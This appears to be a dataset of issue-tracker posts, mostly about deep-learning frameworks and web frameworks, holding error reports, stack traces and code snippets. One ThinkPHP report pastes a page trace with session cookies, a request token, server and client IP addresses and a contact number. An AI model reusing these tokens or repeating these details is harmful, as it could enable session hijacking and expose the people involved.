Use `VLOG` to print verbose log when refactoring Paddle.,"We should use to print verbose logs, it because It is easier to debug when something goes wrong. is disabled by default. We can enable in runtime by using and . A better explanation is here   <code>: VLOG VLOG VLOG GLOG_v GLOG_vmodule"
"[CT][MS][UpsampleTrilinear3d] Test report ""Launch graph failed, graph id: 0"" at ascend","UpsampleTrilinear3d report ""Launch graph failed, graph id: 0"" at ascend / 硬件环境: /device ascend : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph ascend 上执行测试用例 用例通过没有问题   <code>: def test_upsampletrilinear3d_scales_list_align_corners_false_fp32(): x = Tensor(np.random.randn(2, 5, 60, 16, 128), dtype=mstype.float32) fact = UpsampleTrilinear3dMock(attributes={'scales': [4.5, 6.9, 32.8], 'align_corners': False}, inputs=[x]) fact.forward_cmp() fact.grad_cmp() def test_upsampletrilinear3d_scales_list_align_corners_false_fp32(): x = Tensor(np.random.randn(2, 5, 60, 16, 128), dtype=mstype.float32) fact = UpsampleTrilinear3dMock(attributes={'scales': [4.5, 6.9, 32.8], 'align_corners': False}, inputs=[x]) &gt; fact.forward_cmp() test_upsampletrilinear3d.py:67: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/upsampletrilinear3d_ops.py:89: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/upsampletrilinear3d_ops.py:44: in forward_mindspore_impl out = net(self.x) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/archiconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/nn/cell.py:572: in __call__ out = self.compile_and_run(*args) /root/archiconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/nn/cell.py:976: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/archiconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/common/api.py:1146: in __call__ return self.run(obj, *args, phase=phase) /root/archiconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/common/api.py:1183: in run return self._exec_pip(obj, *args, phase=phase_real) /root/archiconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/common/api.py:93: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff7dc0f910&gt;, obj = WrapOp&lt;&gt;, phase = 'train.1654759420215484928.281473514892464.0' args = (Tensor(shape=[2, 5, 60, 16, 128], dtype=Float32, value= [[[[[ 5.93634069e-01, -1.89960909e+00, 5.93071103e-01 ... 2...], [ 8.26009810e-01, 9.79440272e-01, 7.86900997e-01 ... -1.56368041e+00, -1.34031308e+00, -2.13075852e+00]]]]]),) fn = &lt;bound method UpsampleTrilinear3d.construct of WrapOp&lt;&gt;&gt; @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct obj.__parse_method__ = fn.__name__ &gt; return self._graph_executor(args, phase) E RuntimeError: mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:557 Run] Launch graph failed, graph id: 0"
"训练时sum op上报错Expected in_dim == x_dim, but received in_dim:10, 512 != x_dim:548, 512","在实现attention网络时报错，代码如下：   <code>: def get_p_attention(p_emb_layer, lstm_layer, hidden_dim): p_fc = fluid.layers.fc(input=p_emb_layer, size=hidden_dim, act='tanh') plstm_0, _ = fluid.layers.dynamic_lstm(input=p_fc, \ size=hidden_dim, candidate_activation='relu', gate_activation='sigmoid', cell_activation='sigmoid', is_reverse=True) p_lstm_layer = fluid.layers.sequence_last_step(input=plstm_0) p_expand = fluid.layers.sequence_expand(x=p_lstm_layer, y=lstm_layer) combined_input = fluid.layers.elementwise_mul(x=lstm_layer, y=p_expand) attention_weight = fluid.layers.fc(input=combined_input, size=1, act='tanh', bias_attr=False) #得到归一化权重 normed_attention_weight = fluid.layers.sequence_softmax(input=attention_weight) assist_info = {'unnormalized_p_attention_weight': attention_weight} return normed_attention_weight, assist_info def att_model(): word_emb_fixed = True if conf_dict['word_emb_fixed'] == ""True"" else False emb_distributed = not conf_dict['is_local'] conf_dict['is_sparse'] = bool(conf_dict['is_sparse']) char_param = fluid.ParamAttr(name=conf_dict['emb_name'], trainable=(not char_emb_fixed)) char_embedding = fluid.layers.embedding( input=char, size=[data_reader.get_dict_size('charemb_dict'), conf_dict['char_dim']], dtype='float32', is_distributed=emb_distributed, is_sparse=emb_distributed, param_attr=char_param) p_embedding = fluid.layers.embedding( input=p_word, size=[data_reader.get_dict_size('charemb_dict'), conf_dict['char_dim']], dtype='float32', is_distributed=emb_distributed, is_sparse=emb_distributed, param_attr=char_param) emb_layers = [char_embedding, p_embedding] # input hidden char_fc = fluid.layers.fc(input=char_embedding, size=hidden_dim, act='tanh') lstm_layer, _ = fluid.layers.dynamic_lstm( input=char_fc, size=hidden_dim, candidate_activation='relu', gate_activation='sigmoid', cell_activation='sigmoid', is_reverse=0) position_weight_layer, position_attention_assist_info = \ get_p_attention(p_embedding, lstm_layer, hidden_dim) p_scaled_lstm_layer = fluid.layers.elementwise_mul(x=lstm_layer, y=position_weight_layer) p_lstm_layer = fluid.layers.sequence_pool(input=p_scaled_lstm_layer, pool_type='sum') lstm_layers = [p_lstm_layer, lstm_layer] hidden_0_layers = [ fluid.layers.fc(input=l_layer, size=hidden_dim, act='tanh') for l_layer in lstm_layers ] hidden_0 = fluid.layers.sums(input=hidden_0_layers) lstm_0 = fluid.layers.dynamic_lstm( input=hidden_0/4, size=hidden_dim, candidate_activation='relu', gate_activation='sigmoid', cell_activation='sigmoid') # stack L-LSTM and R-LSTM with direct edges input_tmp = [hidden_0, lstm_0] for i in range(1, depth): mix_hidden = fluid.layers.sums(input=[ fluid.layers.fc(input=input_tmp[0], size=hidden_dim, act='tanh'), fluid.layers.fc(input=input_tmp[1], size=hidden_dim, act='tanh') ]) lstm = fluid.layers.dynamic_lstm( input=mix_hidden, size=hidden_dim, candidate_activation='relu', gate_activation='sigmoid', cell_activation='sigmoid', is_reverse=((i % 2) == 1)) input_tmp = [mix_hidden, lstm] # output feature_out = fluid.layers.sums(input=[ fluid.layers.fc(input=input_tmp[0], size=label_dict_len, act='tanh'), fluid.layers.fc(input=input_tmp[1], size=label_dict_len, act='tanh') ]) return feature_out ` 错误信息： ` cost = exe.run(main_program, feed=feeder.feed(data), fetch_list=[avg_cost]) File ""./tools/paddle_fluid/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 472, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: Enforce failed. Expected in_dim == x_dim, but received in_dim:10, 512 != x_dim:548, 512. Input tensors must have same shape at [/paddle/paddle/fluid/operators/sum_op.cc:59] PaddlePaddle Call Stacks: 0 0x7f78eff19ed2p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 482 1 0x7f78f044c7a5p paddle::operators::SumOp::InferShape(paddle::framework::InferShapeContext*) const + 1237 2"
点击演示数据的tag标签时，出现错误,"使用环境 PHP 版本：7.4 MYSQL 版本：5.6 浏览器 版本：谷歌95.0 本地或线上：本地(IIS)和线上(NGIX)均有一样的问题 点击演示数据的tag标签时，出现错误   <code>: GET Dataempty POST Dataempty Filesempty Cookies thinkphp_show_page_trace 0|0 serverType nginx ltd_end -1 pro_end -1 order id desc memSize 7768 bt_user_info {""status"":true,""msg"":""%u83B7%u53D6%u6210%u529F!"",""data"":{""username"":""159****6022""}} SESSIONID 0ef44c4a-7b81-4546-82d1-ce171869ffbc.ovHV_Rgc93F7Q9w7emQegaBef7A sites_path /www/wwwroot site_type -1 SetName backup_path /www/backup distribution centos8 force 0 load_search undefined SetId inputPath ChangePath 14 path_dir_change /www/wwwroot/45.56.73.242/ pnull 10 soft_remarks {""list"":[""%u4F01%u4E1A%u7248%u3001%u4E13%u4E1A%u7248%u63D2%u4EF6"",""15%u5929%u65E0%u7406%u7531%u9000%u6B3E"",""%u53EF%u66F4%u6362IP"",""%u8D60%u90012%u5F20%u5546%u7528%u8BC1%u4E66"",""%u8D60%u90011000%u6761%u77ED%u4FE1"",""%u4F4E%u81F31.86%u5143/%u5929"",""%u5546%u7528%u9632%u706B%u5899%u6388%u6743"",""%u5E74%u4ED8%u4F01%u4E1A%u7248%u670D%u52A1%u7FA4"",""%u4EA7%u54C1%u6388%u6743%u8BC1%u4E66""],""pro_list"":[""%u4E13%u4E1A%u7248%u63D2%u4EF6"",""15%u5929%u65E0%u7406%u7531%u9000%u6B3E"",""%u53EF%u66F4%u6362IP"",""%u4F4E%u81F31.52%u5143/%u5929"",""%u5546%u7528%u9632%u706B%u5899%u6388%u6743"",""%u4EA7%u54C1%u6388%u6743%u8BC1%u4E66""],""kfqq"":""3007255432"",""kf"":""http://q.url.cn/CDfQPS?_type=wpa&amp;qidian=true"",""qun"":""""} load_type 0 p0 7 load_page 7 page_number 20 file_recycle_status true rank list network-unitType KB/s disk-unitType KB/s 9513d8c302ddf42b2deb47f752727d8e 5cf0b974-8200-4382-8146-4ff6126530da.MShs3207XPqVqbP96BcdXng38ic request_token RWheSOcANx1YgSPpFoRnZNYlG4Qvn6fqcnfnpVeMQwO71yGW softType 11 record_paste_type null Path /www/wwwroot/ceshi.com/config PHPSESSID 0f8m39j49ih3ctjc2drai3q6fm Sessionempty Server/Request Data USER www HOME /home/www HTTP_COOKIE thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; serverType=nginx; ltd_end=-1; pro_end=-1; order=id%20desc; memSize=7768; bt_user_info=%7B%22status%22%3Atrue%2C%22msg%22%3A%22%u83B7%u53D6%u6210%u529F%21%22%2C%22data%22%3A%7B%22username%22%3A%22159****6022%22%7D%7D; SESSIONID=0ef44c4a-7b81-4546-82d1-ce171869ffbc.ovHV_Rgc93F7Q9w7emQegaBef7A; sites_path=/www/wwwroot; site_type=-1; SetName=; backup_path=/www/backup; distribution=centos8; force=0; load_search=undefined; SetId=inputPath; ChangePath=14; path_dir_change=/www/wwwroot/45.56.73.242/; pnull=10; soft_remarks=%7B%22list%22%3A%5B%22%u4F01%u4E1A%u7248%u3001%u4E13%u4E1A%u7248%u63D2%u4EF6%22%2C%2215%u5929%u65E0%u7406%u7531%u9000%u6B3E%22%2C%22%u53EF%u66F4%u6362IP%22%2C%22%u8D60%u90012%u5F20%u5546%u7528%u8BC1%u4E66%22%2C%22%u8D60%u90011000%u6761%u77ED%u4FE1%22%2C%22%u4F4E%u81F31.86%u5143/%u5929%22%2C%22%u5546%u7528%u9632%u706B%u5899%u6388%u6743%22%2C%22%u5E74%u4ED8%u4F01%u4E1A%u7248%u670D%u52A1%u7FA4%22%2C%22%u4EA7%u54C1%u6388%u6743%u8BC1%u4E66%22%5D%2C%22pro_list%22%3A%5B%22%u4E13%u4E1A%u7248%u63D2%u4EF6%22%2C%2215%u5929%u65E0%u7406%u7531%u9000%u6B3E%22%2C%22%u53EF%u66F4%u6362IP%22%2C%22%u4F4E%u81F31.52%u5143/%u5929%22%2C%22%u5546%u7528%u9632%u706B%u5899%u6388%u6743%22%2C%22%u4EA7%u54C1%u6388%u6743%u8BC1%u4E66%22%5D%2C%22kfqq%22%3A%223007255432%22%2C%22kf%22%3A%22http%3A//q.url.cn/CDfQPS%3F_type%3Dwpa%26qidian%3Dtrue%22%2C%22qun%22%3A%22%22%7D; load_type=0; p0=7; load_page=7; page_number=20; file_recycle_status=true; rank=list; network-unitType=KB/s; disk-unitType=KB/s; 9513d8c302ddf42b2deb47f752727d8e=5cf0b974-8200-4382-8146-4ff6126530da.MShs3207XPqVqbP96BcdXng38ic; request_token=RWheSOcANx1YgSPpFoRnZNYlG4Qvn6fqcnfnpVeMQwO71yGW; softType=11; thinkphp_show_page_trace=0|0; record_paste_type=null; Path=/www/wwwroot/ceshi.com/config; PHPSESSID=0f8m39j49ih3ctjc2drai3q6fm HTTP_ACCEPT_LANGUAGE zh-CN,zh;q=0.9 HTTP_ACCEPT_ENCODING gzip, deflate HTTP_REFERER http://45.56.73.242:200/public/index.php/cms/tags/index/menuid/107.html HTTP_ACCEPT text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 HTTP_USER_AGENT Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 HTTP_UPGRADE_INSECURE_REQUESTS 1 HTTP_DNT 1 HTTP_CACHE_CONTROL max-age=0 HTTP_CONNECTION keep-alive HTTP_HOST 45.56.73.242:200 PATH_INFO /tag/%E6%89%93%E8%83%B6.html REDIRECT_STATUS 200 SERVER_NAME ceshi.com SERVER_PORT 200 SERVER_ADDR 45.56.73.242 REMOTE_PORT 19476 REMOTE_ADDR 113.91.145.28 SERVER_SOFTWARE nginx/1.21.0 GATEWAY_INTERFACE CGI/1.1 REQUEST_SCHEME http SERVER_PROTOCOL HTTP/1.1 DOCUMENT_ROOT /www/wwwroot/ceshi.com DOCUMENT_URI /public/index.php/tag/打胶.html REQUEST_URI /public/index.php/tag/%E6%89%93%E8%83%B6.html SCRIPT_NAME /public/index.php CONTENT_LENGTH CONTENT_TYPE REQUEST_METHOD GET QUERY_STRING SCRIPT_FILENAME /www/wwwroot/ceshi.com/public/index.php FCGI_ROLE RESPONDER PHP_SELF /public/index.php/tag/%E6%89%93%E8%83%B6.html REQUEST_TIME_FLOAT 1635220117.665 REQUEST_TIME 1635220117 Environment Variablesempty ThinkPHP Constants IF_PUBLIC true ROOT_PATH /www/wwwroot/ceshi.com/public/../ APP_PATH /www/wwwroot/ceshi.com/public/../application/ DS / ADDON_PATH /www/wwwroot/ceshi.com/public/../addons/ ROOT_URL /public/ TEMPLATE_PATH /www/wwwroot/ceshi.com/public/../templates/ PINYIN_DEFAULT 4096 PINYIN_TONE 2 PINYIN_NO_TONE 4 PINYIN_ASCII_TONE 8 PINYIN_NAME 16 PINYIN_KEEP_NUMBER 32 PINYIN_KEEP_ENGLISH 64 PINYIN_UMLAUT_V 128 PINYIN_KEEP_PUNCTUATION 256```"
MD5计算不一致,"对于文件 MD5计算我采用的是： 算出来的 MD5 与通过系统内置的 md5 指定不一致。 mac 下通过 md5 xxx.aaa.txt win 下通过 certutil -hashfile xxx.aaa MD5 请核实！   <code>: String file = ""xxx/aaa.txt""; String s = DigestUtil.md5Hex(file);"
Python packages layer and operator,"In a DL system, we can compose one or more fine grained operators into a coarse grained one. For example, the FC layer can be composed of a multiplication operator and an add operator. Here is a question -- what is the difference between layer and operator. In general, operators are those very fine grained operations, e.g., mul and add. In the implementation, we can write them as C++ functions: Then we can wrap them into operators which are C++ classes and can be created from Python bindings by name. A C macro can do this. For example, the following macro invocation generates so that in Python we can create operator mul by: Also, at the same time, we can compose a coarse level C++ operator class by composing functions and : We need to support such composition in Python as well. To do so, we need a higher level Python wrapping of operator creation than . This higher level operator API should be compatible with the layer API. Let's explain using an example. Suppose that we are going to compose the FC using mul and add in Python, we'd like to have Python functions and defined in module : so that we can define We'd like to have Python bindings to operators in package , and Python compositions of operators in package . This is how we differentiate layer and operators in PaddlePaddle.   <code>: template &lt;typename T&gt; T add(T x, T y) { return x + y; } template &lt;typename T&gt; T mul(T x, T y) { return x * y; } #define MAKE_FUNCTION_OPERATOR(mul); class mulOp : public OperatorBase {...}; REGISTER_OP(mulOp, ""mul""); X1 = Var() X2 = Var() Y = Var() paddle.cpp.create_operator(""mul"", input=[X1, X2], output=Y) mul add class FCOp : public OperatorBase { public: void Run(...) { add(mul(Input(""X""), Input(""W"")), Input(""b""); } }; REGISTER_OP(FCOp, ""fc""); paddle.cpp.create_operator mul add operator def mul(X1, X2): O = Var paddle.cpp.create_operator(""mul"", input={X1, Y1], output=O) return O def add(X1, X2): O = Var paddle.cpp.create_operator(""add"", input={X1, X2], output=O) return O def layer.fc(X): W = Var() b = Var() return operator.add(operator.mul(X, W), b) paddle.operator paddle.layer"
[MS][Ascend]模型在昇腾上8卡无法训练,"1.我们基于vit设计了新的Transformer模型，但是在ModelArts昇腾使用8卡动态图训练返回报错，报错为RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1509 SyncStream] Sync stream error!，在4卡或者单卡均可以进行训练 2.我们在GPU（V100）上训练，动态图模式为1.5秒/step，但在Ascend上训练动态图模型为12秒/step,静态图模式为5.6秒/step，请问怎样解决训练速度问题 / 硬件环境: Ascend: 8 * Ascend-910 CPU：192 核 720GiB /device ascend /device gpu /device cpu : MindSpore-1.3.0-c78-python3.7-euleros2.8-aarch64 -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 1.使用8卡可以正常训练 2.提高昇腾上的训练速度 1.我们设置HCCL_CONNECT_TIMEOUT=900，仍然无法解决问题 2.我们生成了DEBUG级别日志，但是此issue中我无法找到上传附件的选项，所以暂时无法提供   <code>: [ERROR] DEVICE(114,ffff98978a50,python):2022-03-15-11:54:36.154.075 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:711] SyncStream] Call runtime rtStreamSynchronize error. [ERROR] SESSION(114,ffff98978a50,python):2022-03-15-11:54:36.154.111 [mindspore/ccsrc/backend/session/ascend_session.cc:1509] SyncStream] Sync stream error! [ERROR] ME(114:281473241811536,MainProcess):2022-03-15-11:54:36.155.020 [mindspore/dataset/engine/datasets.py:2541] Uncaught exception: Traceback (most recent call last): File ""/home/work/user-job-dir/DGMN2_on_vit/train_hccl.py"", line 246, in &lt;module&gt; train_net() File ""/cache/user-job-dir/DGMN2_on_vit/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""/home/work/user-job-dir/DGMN2_on_vit/train_hccl.py"", line 229, in train_net model.train(epoch_size, dataset, callbacks=cb, sink_size=step_size) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 439, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 505, in _train_dataset_sink_process list_callback.step_end(run_context) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/callback/_callback.py"", line 217, in step_end cb.step_end(run_context) File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 55, in step_end _pynative_exec.sync() File ""/usr/local/ma/python3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 402, in sync self._executor.sync() RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1509 SyncStream] Sync stream error!"
数据表格里面的全选和选中当前多选框的事件起冲突了，导致全选效果取消后 第一个选中当前多选框无回调函数,"单独的全选和单独的选中当前多选框是没有问题的，但是选中全选后，再次点击一个复选框，取消全选和当前选中效果，全选会导致单选的无法回调，是个空的，然后再次取消一个选中效果是有回调函数，也就是说第一个取消选中效果的正好和取消全选的事件冲突了。 全选   <code>: //复选框监听事件 table.on('checkbox(industrySite)', function(obj){ console.log(obj); if(obj.type == ""one"") { if (obj.checked == true) { //添加数组 var index1 = nameList.indexOf(obj.data.name); if (index1 == -1) { nameList.push(obj.data.name); } var index2 = codeList.indexOf(obj.data.code); if (index2 == -1) { codeList.push(obj.data.code); } console.log(""添加name"",index1, nameList); } else { //删除数组 var index2 = nameList.indexOf(obj.data.name); if (index2 &gt; -1) { nameList.splice(index2, 1); } var index2 = codeList.indexOf(obj.data.code); if (index2 &gt; -1) { codeList.splice(index2, 1); } console.log(""删除后的"",index2, nameList); } }else{ if (obj.checked == true) { //选中所有 console.log(""全选"",table.checkStatus('industryTable').data); var res = table.checkStatus('industryTable').data; nameList=[]; codeList=[]; let len =res.length; for (let i =0;i&lt;len ;i++){ nameList.push(res[i].name); codeList.push(res[i].code); } } else { nameList=[]; codeList=[]; } } });"
tinystudio服务编辑器优化：生成服务的时候如果service类只实现一个接口bean名称就按接口命名,"RT。 在服务编辑器中选中服务后，会生成服务，在xxx.service.xml中： 以上这个bean名称现在是functionServiceImpl，但是在定义bean的时候一般是按它的接口名字来命名。所以这里如果是这个类只实现一个接口，最后这个bean的名字一般叫functionService，也便于重写。   <code>: &lt;service-components&gt; &lt;service-component type=""org.tinygroup.bizframedslimpl.function.FunctionServiceImpl"" bean=""functionServiceImpl""&gt; 。。。 &lt;/service-component&gt; &lt;/service-components&gt;"
远程请求报文头支持通过Dictionary设置多个,"Furion 版本号 2.19.1 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 发生了什么？ 希望通过字典直接设置多个请求头，如下： 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: [Get(""authentication?loginName={loginName}&amp;password={password}"")] Task&lt;User&gt; LoginAsync(string loginName, string password, [Headers] IDictionary&lt;string, object&gt; headers);"
paddlepaddle 的 fluid.layers.mean_iou方法和自己算的不一样,"1）PaddlePaddle版本：1.8.5 3）GPU： v100 4）系统环境：AISTUDIO iou函数为我自己实现的计算miou函数,avg_iou调用的fluid.layers.mean_iou api 但是对于下图 两个的分割结果不一致 从直观上就感觉官方的计算出了问题... 其中的第一个list分别表示每一类的iou 后面的0.4 表示三类miou 下面的tenso表示用paddle的mean_iou求得的结果   <code>: def iou(logit, label, num_classes = 3): logit = fluid.layers.transpose(logit, [0, 2, 3, 1]) logit = fluid.layers.reshape(logit, [-1, num_classes]) logit = fluid.layers.argmax(logit, axis=1) logit = fluid.layers.unsqueeze(logit, axes=1) logit = fluid.layers.one_hot(logit, depth=num_classes).astype('int64') label = fluid.layers.reshape(label, [-1,1]) label = fluid.layers.one_hot(label, depth=num_classes).astype('int64') result = fluid.layers.elementwise_mul(logit, label) TP = fluid.layers.reduce_sum(result, dim=[0]).astype('float32') SUM = (fluid.layers.reduce_sum(label, dim=[0]) + fluid.layers.reduce_sum(logit, dim=[0])).astype('float32') + 1e-12 iou = TP / (SUM - TP) total_iou = iou.numpy() count, miou = 0, 0. for iou in total_iou: if iou == 0.: continue miou += iou count += 1 return total_iou, miou / count '''获取单张图像的miou''' def avg_miou(logit, label, num_classes = 3): '''将图片转化成为 (h*w , c) label 转换为 (h*w,1) -&gt;(h*w, c)''' logit = fluid.layers.transpose(logit, [0, 2, 3, 1]) logit = fluid.layers.reshape(logit, [-1, num_classes]) logit = fluid.layers.argmax(logit, axis=1) logit = fluid.layers.unsqueeze(logit, axes=1) logit = fluid.layers.one_hot(logit, depth=num_classes).astype('int64') label = fluid.layers.reshape(label, [-1,1]) label = fluid.layers.one_hot(label, depth=num_classes).astype('int64') avg_miou, _ , _ = fluid.layers.mean_iou(logit, label, num_classes) return avg_miou"
unexpected keyword argument 'top_k',"网络里并没有写过top_k，但是一直报top_k参数错误   <code>: F0623 09:15:01.814636 27241 PythonUtil.cpp:131] Check failed: (ret) != nullptr Current PYTHONPATH: ['/home/disk1/normandy/maybach/38769/workspace', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/setuptools-18.2-py2.7.egg', '/home/disk1/normandy/maybach/38769/workspace/paddle', '/home/disk1/normandy/maybach/38769/workspace', '/home/disk1/normandy/maybach/38769/workspace/thirdparty/thirdparty', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python27.zip', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/plat-linux2', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/lib-tk', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/lib-old', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/lib-dynload', '/home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages'] Python Error: &lt;type 'exceptions.TypeError'&gt; : precision_recall_evaluator() got an unexpected keyword argument 'top_k' Python Callstack: /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer/config_parser.py : 3607 /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer/config_parser.py : 3600 conf/trainer_config.conf : 99 /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer_config_helpers/default_decorators.py : 53 /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer_config_helpers/layers.py : 329 /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer_config_helpers/layers.py : 3850 /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer_config_helpers/layers.py : 3844 /home/disk1/normandy/maybach/38769/workspace/python27-gcc482/lib/python2.7/site-packages/paddle/trainer_config_helpers/default_decorators.py : 53 Call Object failed. Path URL 2.39KB"
Support variable-dimension input feature for 2D convolution operation.,add type instead of using . the 2D or 3D input feature should be numpy.array The data feeder will set height and width according to the shape of input data each mini-batch. Fix #2198:add baidu Analystics   <code>: dense_array dense_vector
"the new develop branch code produce ""libpaddle_pserver_cclient.h"" file after compile","here is the Log   <code>: [xzl@ paddle_me]$ git status On branch develop Your branch is up-to-date with 'origin/develop'. Untracked files: (use ""git add &lt;file&gt;..."" to include in what will be committed) paddle/trainer/libpaddle_pserver_cclient.h"
如何去获取用户真实IP,"环境信息 pigx版本: 忘记了 是否修改包名: intshock ServletUtil.getClientIP(request)； 这样写的获取用户IP，但是得到的是服务器内网IP不是用户真实IP应该怎么办   <code>: public static String getClientIP(HttpServletRequest request, String... otherHeaderNames) { String[] headers = new String[]{""X-Forwarded-For"", ""X-Real-IP"", ""Proxy-Client-IP"", ""WL-Proxy-Client-IP"", ""HTTP_CLIENT_IP"", ""HTTP_X_FORWARDED_FOR""}; if (ArrayUtil.isNotEmpty(otherHeaderNames)) { headers = (String[])ArrayUtil.addAll(new String[][]{headers, otherHeaderNames}); } return getClientIPByHeader(request, headers);"
【众智】【计算-AICPU开发】MaxPool3DGradWithArgmax,"AICPU算子接入 MaxPool3DWithArgmax的反向算子。 接口目录：mindspore/ops/operations/_grad_ops.py ksize List(int) 属性 strides List(int) 属性 pads List(int) 属性 dilation List(int) 属性 ceil_mode bool 属性 data_format string 属性 dtype mindspore.dtype 属性 x grads argmax y 对应底层算子 对应底层AICPU算子MaxPool3DGradWithArgmax 友商接口参考 3. 异常处理 4. 算子反向 无反向   <code>: class MaxPool3DGradWithArgmax (Primitive): REG_OP(MaxPool3DGradWithArgmax) .INPUT(x, TensorType::RealNumberType()) .INPUT(grads, TensorType::RealNumberType()) .INPUT(argmax, TensorType::IndexNumberType()) .OUTPUT(y, TensorType::RealNumberType()) .REQUIRED_ATTR(ksize, ListInt) .REQUIRED_ATTR(strides, ListInt) .REQUIRED_ATTR(pads, ListInt) .REQUIRED_ATTR(dilation, ListInt) .ATTR(ceil_mode, Bool, false) .ATTR(data_format, String, ""NCDHW"") .ATTR(dtype, Int, 0) .OP_END_FACTORY_REG(MaxPool3DGradWithArgmax)"
oracle自动生成代码失败,"使用版本 springboot2.0.2 + mybatis-plus-boot-starter2.3 自动生成oracle代码失败 public class MpGenerator { // InjectionConfig cfg = new InjectionConfig() { // @加贝 // public void initMap() { // Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(); // map.put(""abc"", this.getConfig().getGlobalConfig().getAuthor() + ""-mp""); // this.setMap(map); // } // }; // List focList = new ArrayList(); // focList.add(new FileOutConfig(""/template/list.jsp.vm"") { // @加贝 // public String outputFile(TableInfo tableInfo) { // // 自定义输入文件名称 // return ""D://my_"" + tableInfo.getEntityName() + "".jsp""; // } // }); // cfg.setFileOutConfigList(focList); // mpg.setCfg(cfg); // focList.add(new FileOutConfig(""/templates/mapper.xml.vm"") { // @加贝 // public String outputFile(TableInfo tableInfo) { // return ""/develop/code/xml/"" + tableInfo.getEntityName() + "".xml""; // } // }); // cfg.setFileOutConfigList(focList); // mpg.setCfg(cfg); // tc.setXml(null); tc.setController(null); mpg.setTemplate(tc); // System.err.println(mpg.getCfg().getMap().get(""abc"")); } 19:06:01.118 [main] DEBUG freemarker.cache - Couldn't find template in cache for ""templates/entity.java.ftl""(""zh_CN"", UTF-8, parsed); will try to load it. 19:06:01.119 [main] DEBUG freemarker.cache - TemplateLoader.findTemplateSource(""templates/entity.java_zh_CN.ftl""): Not found 19:06:01.120 [main] DEBUG freemarker.cache - TemplateLoader.findTemplateSource(""templates/entity.java_zh.ftl""): Not found 19:06:01.121 [main] DEBUG freemarker.cache - TemplateLoader.findTemplateSource(""templates/entity.java.ftl""): Found 19:06:01.121 [main] DEBUG freemarker.cache - Loading template for ""templates/entity.java.ftl""(""zh_CN"", UTF-8, parsed) from 